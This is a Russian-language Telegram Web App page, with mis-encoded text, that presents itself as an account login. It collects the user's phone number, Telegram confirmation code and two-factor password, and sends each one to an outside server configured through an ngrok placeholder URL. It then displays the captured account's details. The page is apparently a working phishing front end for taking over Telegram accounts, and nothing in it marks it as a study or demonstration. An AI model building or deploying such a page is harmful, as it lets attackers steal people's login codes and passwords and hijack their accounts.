<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–í—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            width: 100%;
            max-width: 400px;
        }
        
        h1 {
            font-size: 24px;
            margin-bottom: 10px;
            text-align: center;
        }
        
        p {
            color: var(--tg-theme-hint-color, #999);
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }
        
        .step {
            display: none;
        }
        
        .step.active {
            display: block;
            animation: fadeIn 0.3s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 14px;
        }
        
        input {
            width: 100%;
            padding: 12px 16px;
            font-size: 16px;
            border: 2px solid var(--tg-theme-button-color, #0088cc);
            border-radius: 8px;
            background: var(--tg-theme-bg-color, #ffffff);
            color: var(--tg-theme-text-color, #000000);
            outline: none;
            transition: border-color 0.3s;
        }
        
        input:focus {
            border-color: var(--tg-theme-button-color, #0088cc);
            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
        }
        
        button {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            color: var(--tg-theme-button-text-color, #ffffff);
            background: var(--tg-theme-button-color, #0088cc);
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: opacity 0.3s;
        }
        
        button:hover {
            opacity: 0.9;
        }
        
        button:active {
            opacity: 0.8;
        }
        
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        .error {
            color: #ff3b30;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        
        .error.show {
            display: block;
        }
        
        .success {
            background: #4cd964;
            color: white;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 20px;
            display: none;
        }
        
        .success.show {
            display: block;
        }
        
        .info-box {
            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        
        .back-button {
            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
            color: var(--tg-theme-text-color, #000000);
            margin-top: 10px;
        }
        
        .password-step {
            display: none;
            margin-top: 20px;
        }
        
        .password-step.show {
            display: block;
            animation: fadeIn 0.3s;
        }
        
        .loader {
            display: none;
            text-align: center;
            margin: 10px 0;
        }
        
        .loader.show {
            display: block;
        }
        
        .spinner {
            border: 3px solid var(--tg-theme-hint-color, #ccc);
            border-top: 3px solid var(--tg-theme-button-color, #0088cc);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- –®–∞–≥ 1: –í–≤–æ–¥ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ -->
        <div class="step active" id="step1">
            <h1>üì± –í—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç</h1>
            <p>–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</p>
            
            <div class="input-group">
                <label for="phone">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</label>
                <input 
                    type="tel" 
                    id="phone" 
                    placeholder="+7 (999) 123-45-67"
                    autocomplete="tel"
                >
                <div class="error" id="phoneError">–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä</div>
            </div>
            
            <div class="loader" id="phoneLoader">
                <div class="spinner"></div>
                <p style="margin-top: 10px; font-size: 14px;">–û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞...</p>
            </div>
            
            <button id="sendPhoneButton">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>
        </div>

        <!-- –®–∞–≥ 2: –í–≤–æ–¥ –∫–æ–¥–∞ -->
        <div class="step" id="step2">
            <h1>üì© –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥</h1>
            <p id="phoneDisplay"></p>
            
            <div class="info-box">
                ‚ÑπÔ∏è –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram –Ω–∞ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞
            </div>
            
            <div class="success" id="successMessage">
                ‚úì –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!
            </div>
            
            <div class="input-group">
                <label for="code">–ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è (5 —Ü–∏—Ñ—Ä)</label>
                <input 
                    type="text" 
                    id="code" 
                    placeholder="12345"
                    autocomplete="off"
                    inputmode="numeric"
                    maxlength="5"
                >
                <div class="error" id="codeError">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ 5 —Ü–∏—Ñ—Ä</div>
            </div>
            
            <!-- –ü–æ–ª–µ –¥–ª—è –ø–∞—Ä–æ–ª—è 2FA -->
            <div class="password-step" id="passwordStep">
                <div class="info-box" style="background: #fff3cd; color: #856404;">
                    üîê –¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
                </div>
                <div class="input-group">
                    <label for="password">–ü–∞—Ä–æ–ª—å 2FA</label>
                    <input 
                        type="password" 
                        id="password" 
                        placeholder="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å"
                        autocomplete="off"
                    >
                    <div class="error" id="passwordError">–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å</div>
                </div>
            </div>
            
            <div class="loader" id="codeLoader">
                <div class="spinner"></div>
                <p style="margin-top: 10px; font-size: 14px;">–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞...</p>
            </div>
            
            <button id="sendCodeButton">–í–æ–π—Ç–∏</button>
            <button class="back-button" id="backButton">‚Üê –ù–∞–∑–∞–¥</button>
        </div>

        <!-- –®–∞–≥ 3: –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥ -->
        <div class="step" id="step3">
            <h1>‚úÖ –£—Å–ø–µ—à–Ω–æ!</h1>
            <div class="success show">
                –í—ã —É—Å–ø–µ—à–Ω–æ –≤–æ—à–ª–∏ –≤ –∞–∫–∫–∞—É–Ω—Ç
            </div>
            <div class="info-box" id="accountInfo"></div>
            <button id="closeButton">–ó–∞–∫—Ä—ã—Ç—å</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        
        // –í–ê–ñ–ù–û: –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à —Ä–µ–∞–ª—å–Ω—ã–π URL webhook —Å–µ—Ä–≤–µ—Ä–∞
        // –î–ª—è –ª–æ–∫–∞–ª—å–Ω–æ–π —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ ngrok
        const API_URL = 'https://YOUR_NGROK_URL'; // –Ω–∞–ø—Ä–∏–º–µ—Ä: https://abc123.ngrok.io
        
        // –ü–æ–ª—É—á–∞–µ–º —Ç–æ–∫–µ–Ω –∏–∑ URL
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token');
        
        if (!token) {
            alert('–û—à–∏–±–∫–∞: —Ç–æ–∫–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–µ –±–æ—Ç–∞ –∫–æ–º–∞–Ω–¥–æ–π /start');
        }
        
        // –≠–ª–µ–º–µ–Ω—Ç—ã
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const step3 = document.getElementById('step3');
        const passwordStep = document.getElementById('passwordStep');
        
        const phoneInput = document.getElementById('phone');
        const codeInput = document.getElementById('code');
        const passwordInput = document.getElementById('password');
        
        const sendPhoneButton = document.getElementById('sendPhoneButton');
        const sendCodeButton = document.getElementById('sendCodeButton');
        const backButton = document.getElementById('backButton');
        const closeButton = document.getElementById('closeButton');
        
        const phoneError = document.getElementById('phoneError');
        const codeError = document.getElementById('codeError');
        const passwordError = document.getElementById('passwordError');
        const successMessage = document.getElementById('successMessage');
        const phoneDisplay = document.getElementById('phoneDisplay');
        const accountInfo = document.getElementById('accountInfo');
        
        const phoneLoader = document.getElementById('phoneLoader');
        const codeLoader = document.getElementById('codeLoader');
        
        let currentPhone = '';
        let needsPassword = false;
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        tg.expand();
        tg.ready();
        
        // –í–∞–ª–∏–¥–∞—Ü–∏—è
        function validatePhone(phone) {
            const cleanPhone = phone.replace(/\D/g, '');
            return cleanPhone.length >= 10 && cleanPhone.length <= 15 && phone.startsWith('+');
        }
        
        function validateCode(code) {
            return code.length === 5 && /^\d+$/.test(code);
        }
        
        // –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ —à–∞–≥–æ–≤
        function showStep(step) {
            step1.classList.remove('active');
            step2.classList.remove('active');
            step3.classList.remove('active');
            step.classList.add('active');
        }
        
        // –°–±—Ä–æ—Å –æ—à–∏–±–æ–∫
        function resetErrors() {
            phoneError.classList.remove('show');
            codeError.classList.remove('show');
            passwordError.classList.remove('show');
        }
        
        // –ü–æ–∫–∞–∑–∞—Ç—å –æ—à–∏–±–∫—É
        function showError(element, message) {
            element.textContent = message;
            element.classList.add('show');
        }
        
        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è
        function formatPhoneForDisplay(phone) {
            return phone.replace(/(\+\d{1})(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 ($2) ***-$4$5');
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
        async function sendPhone() {
            const phone = phoneInput.value.trim();
            
            if (!validatePhone(phone)) {
                showError(phoneError, '–í–≤–µ–¥–∏—Ç–µ –∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä: +79991234567)');
                return;
            }
            
            resetErrors();
            sendPhoneButton.disabled = true;
            phoneLoader.classList.add('show');
            
            try {
                const response = await fetch(`${API_URL}/api/send-phone`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        token: token,
                        phone: phone
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    currentPhone = phone;
                    phoneDisplay.textContent = `–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –Ω–æ–º–µ—Ä: ${formatPhoneForDisplay(phone)}`;
                    successMessage.classList.add('show');
                    showStep(step2);
                } else {
                    showError(phoneError, data.error || '–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞');
                }
            } catch (error) {
                showError(phoneError, '–û—à–∏–±–∫–∞ —Å–µ—Ç–∏. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ');
                console.error('Error sending phone:', error);
            } finally {
                sendPhoneButton.disabled = false;
                phoneLoader.classList.remove('show');
            }
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è
        async function sendCode() {
            const code = codeInput.value.trim();
            
            if (!validateCode(code)) {
                showError(codeError, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ 5 —Ü–∏—Ñ—Ä');
                return;
            }
            
            resetErrors();
            sendCodeButton.disabled = true;
            codeLoader.classList.add('show');
            
            try {
                const response = await fetch(`${API_URL}/api/send-code`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        token: token,
                        code: code
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥
                    accountInfo.innerHTML = `
                        <strong>–ê–∫–∫–∞—É–Ω—Ç:</strong><br>
                        üë§ –ò–º—è: ${data.user.name}<br>
                        üîñ Username: ${data.user.username}<br>
                        üÜî ID: ${data.user.id}
                    `;
                    showStep(step3);
                } else if (data.need_password) {
                    // –¢—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å 2FA
                    needsPassword = true;
                    passwordStep.classList.add('show');
                    sendCodeButton.textContent = '–í–æ–π—Ç–∏ —Å –ø–∞—Ä–æ–ª–µ–º';
                    showError(codeError, '–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å 2FA –Ω–∏–∂–µ');
                } else {
                    showError(codeError, data.error || '–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥');
                }
            } catch (error) {
                showError(codeError, '–û—à–∏–±–∫–∞ —Å–µ—Ç–∏. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ');
                console.error('Error sending code:', error);
            } finally {
                sendCodeButton.disabled = false;
                codeLoader.classList.remove('show');
            }
        }
        
        // –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–∞—Ä–æ–ª—è 2FA
        async function sendPassword() {
            const password = passwordInput.value.trim();
            
            if (!password) {
                showError(passwordError, '–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å 2FA');
                return;
            }
            
            resetErrors();
            sendCodeButton.disabled = true;
            codeLoader.classList.add('show');
            
            try {
                const response = await fetch(`${API_URL}/api/send-password`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        token: token,
                        password: password
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // –£—Å–ø–µ—à–Ω—ã–π –≤—Ö–æ–¥ —Å 2FA
                    accountInfo.innerHTML = `
                        <strong>–ê–∫–∫–∞—É–Ω—Ç:</strong><br>
                        üë§ –ò–º—è: ${data.user.name}<br>
                        üîñ Username: ${data.user.username}<br>
                        üÜî ID: ${data.user.id}<br>
                        üîê –° –∑–∞—â–∏—Ç–æ–π 2FA
                    `;
                    showStep(step3);
                } else {
                    showError(passwordError, data.error || '–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å');
                }
            } catch (error) {
                showError(passwordError, '–û—à–∏–±–∫–∞ —Å–µ—Ç–∏. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ');
                console.error('Error sending password:', error);
            } finally {
                sendCodeButton.disabled = false;
                codeLoader.classList.remove('show');
            }
        }
        
        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–±—ã—Ç–∏–π
        sendPhoneButton.addEventListener('click', sendPhone);
        
        sendCodeButton.addEventListener('click', function() {
            if (needsPassword) {
                sendPassword();
            } else {
                sendCode();
            }
        });
        
        backButton.addEventListener('click', function() {
            resetErrors();
            needsPassword = false;
            passwordStep.classList.remove('show');
            sendCodeButton.textContent = '–í–æ–π—Ç–∏';
            codeInput.value = '';
            passwordInput.value = '';
            showStep(step1);
        });
        
        closeButton.addEventListener('click', function() {
            tg.close();
        });
        
        // –û–±—Ä–∞–±–æ—Ç–∫–∞ Enter
        phoneInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendPhone();
            }
        });
        
        codeInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && !needsPassword) {
                sendCode();
            }
        });
        
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter' && needsPassword) {
                sendPassword();
            }
        });
        
        // –ê–≤—Ç–æ—Ñ–æ–∫—É—Å –Ω–∞ –ø–æ–ª–µ –≤–≤–æ–¥–∞
        phoneInput.focus();
    </script>
</body>
    </html>
